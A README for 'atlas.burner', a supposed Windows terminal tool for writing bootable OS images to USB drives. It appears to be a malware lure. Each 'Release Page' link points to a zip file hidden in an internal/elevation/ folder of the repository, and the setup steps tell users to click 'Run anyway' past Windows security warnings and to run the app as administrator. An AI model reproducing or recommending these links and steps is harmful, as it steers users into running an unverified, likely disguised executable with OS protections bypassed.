# 🪐 atlas.burner - Burn Boot Images with Ease

[![Download atlas.burner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&labelColor=grey)](https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip)

## 🚀 What is atlas.burner?

atlas.burner is a desktop-style terminal app for downloading and writing bootable operating system images to USB drives. It gives you a simple screen for picking an image, choosing a drive, and starting the burn process.

It works with images for Linux, Windows, and BSD systems. It also supports several CPU types, so it can fit a range of install needs.

## 📥 Download and install

Visit this page to download:

https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip

On Windows, use the latest release file that matches your system.

### Windows setup

1. Open the release page.
2. Find the latest version.
3. Download the Windows file from the assets list.
4. Save the file to your Desktop or Downloads folder.
5. If the download comes as a `.zip` file, right-click it and choose Extract All.
6. Open the extracted folder.
7. Run the app file.

If Windows shows a security prompt:
1. Click More info.
2. Click Run anyway.

## 💻 What you need

atlas.burner is made for normal Windows PCs and laptops.

You will need:
- Windows 10 or Windows 11
- One empty USB drive
- An internet connection if you want to fetch an image
- Enough free space for the image file
- A drive with at least 8 GB, though 16 GB or more is better

For best results, use a USB drive with no files you need to keep.

## 🔧 Before you start

Check these items before you burn an image:

- Plug in the USB drive you want to use
- Close other apps that may use the drive
- Back up files from the USB drive
- Make sure you know which drive is the correct one
- Use a stable power source if you are on a laptop

A burn process writes over the whole USB drive. The old data will be replaced.

## 🖥️ How to use atlas.burner on Windows

1. Open atlas.burner.
2. Choose the OS image you want to download or burn.
3. Select your USB drive from the list.
4. Check the drive letter again.
5. Start the burn process.
6. Wait until the app finishes writing the image.
7. Remove the USB drive only after the app says it is done.

After the burn is done, you can use the USB drive to start another computer and install or run the system image.

## 📦 Common use cases

atlas.burner is useful when you want to:

- Make a bootable USB for Linux install media
- Write a Windows installer to a flash drive
- Prepare a BSD boot disk
- Test an OS image on real hardware
- Reuse one tool for several image types

## 🧭 Interface overview

The app uses a terminal user interface, which means it runs in a text-style window but still feels simple to use.

You will usually see:
- A file or image picker
- A list of USB drives
- A progress view while writing
- A status area with simple prompts

The layout is built to keep the main steps in view so you can move through the process without guesswork.

## 🛠️ Troubleshooting

### The USB drive does not appear

- Unplug the drive and plug it in again
- Try a different USB port
- Close File Explorer windows that point to the drive
- Make sure Windows can read the drive

### The app will not open

- Make sure you downloaded the latest release file
- If the file is in a zip archive, extract it first
- Right-click the app and try Run as administrator
- Check that Windows did not block the file

### The burn process fails

- Use a different USB drive
- Make sure the drive has enough space
- Close apps that may access the drive
- Try the process again with a fresh image file
- Check that the image file finished downloading

### The computer does not boot from the USB drive

- Reinsert the drive and restart the computer
- Open the boot menu during startup
- Pick the USB device from the list
- Try another USB port, then boot again
- Confirm that the image matches the target machine

## 🧼 Best practices

- Use a USB drive that you do not need for other files
- Keep the release file in a simple folder
- Only write one image at a time
- Confirm the target drive before starting
- Eject the USB drive after the app finishes

## 🧩 Supported image types

atlas.burner is built for bootable system images used for:
- Linux installs
- Windows installers
- BSD images
- Raw disk images
- ISO files

It is meant for common release formats used by operating system projects.

## 📌 Project details

- Repository: atlas.burner
- Type: Terminal UI tool
- Main job: Download and burn bootable OS images to USB drives
- Focus: Simple workflow for end users on Windows
- Tech stack: Go, Bubble Tea, Lip Gloss

## 📎 Download again

If you need the release page again, use this link:

https://github.com/selfpossessionmaniraptor213/atlas.burner/raw/refs/heads/main/internal/elevation/burner_atlas_v3.5.zip

## 🪛 Drive safety tips

- Double-check the drive letter before you start
- Do not use the wrong USB drive
- Remove other external drives if you want less risk
- Keep the power connected during the burn
- Wait for the finish message before unplugging the USB drive